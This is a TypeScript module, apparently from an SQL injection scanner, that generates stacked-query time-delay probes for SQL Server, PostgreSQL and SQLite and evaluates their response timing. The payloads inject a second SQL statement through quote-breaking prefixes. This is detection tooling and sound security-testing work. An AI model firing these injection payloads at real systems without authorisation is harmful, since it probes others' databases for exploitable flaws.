import { CandidateParameter, DbmsType } from '../../types/sqlScanner';
import { TimeBasedTester, TimeTestEvaluationResult } from './TimeBasedTester';

export interface StackedQueryProbe {
  dbms: DbmsType;
  delaySeconds: number;
  payload: string;
  expectedDelayMs: number;
}

export class StackedTester {
  /**
   * Generates semicolon-separated multi-statement execution payloads
   */
  public static getStackedProbes(param: CandidateParameter, delaySeconds = 3): StackedQueryProbe[] {
    const context = param.detectedContext || 'single_quote_string';
    const isNum = context === 'numeric';
    const isDoubleQuote = context === 'double_quote_string';
    const isParenthesized = context === 'parenthesized_string';

    const probes: StackedQueryProbe[] = [];
    const expectedDelayMs = delaySeconds * 1000;

    // 1. Microsoft SQL Server Stacked Query
    let mssqlPayload = `'; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    if (isNum) mssqlPayload = `; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    else if (isDoubleQuote) mssqlPayload = `"; WAITFOR DELAY '0:0:${delaySeconds}'--`;
    else if (isParenthesized) mssqlPayload = `'); WAITFOR DELAY '0:0:${delaySeconds}'--`;

    probes.push({
      dbms: 'Microsoft SQL Server',
      delaySeconds,
      payload: mssqlPayload,
      expectedDelayMs,
    });

    // 2. PostgreSQL Stacked Query
    let pgPayload = `'; SELECT pg_sleep(${delaySeconds});--`;
    if (isNum) pgPayload = `; SELECT pg_sleep(${delaySeconds});--`;
    else if (isDoubleQuote) pgPayload = `"; SELECT pg_sleep(${delaySeconds});--`;
    else if (isParenthesized) pgPayload = `'); SELECT pg_sleep(${delaySeconds});--`;

    probes.push({
      dbms: 'PostgreSQL',
      delaySeconds,
      payload: pgPayload,
      expectedDelayMs,
    });

    // 3. SQLite Stacked Query
    let sqlitePayload = `'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--`;
    if (isNum) sqlitePayload = `; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--`;

    probes.push({
      dbms: 'SQLite',
      delaySeconds,
      payload: sqlitePayload,
      expectedDelayMs,
    });

    return probes;
  }

  /**
   * Evaluates stacked query response timing against baseline network latency
   */
  public static evaluateStackedResult(
    baselineDurations: number[],
    testDurationMs: number,
    probe: StackedQueryProbe
  ): TimeTestEvaluationResult {
    return TimeBasedTester.evaluateTiming(
      baselineDurations,
      testDurationMs,
      probe.delaySeconds,
      probe.dbms
    );
  }
}
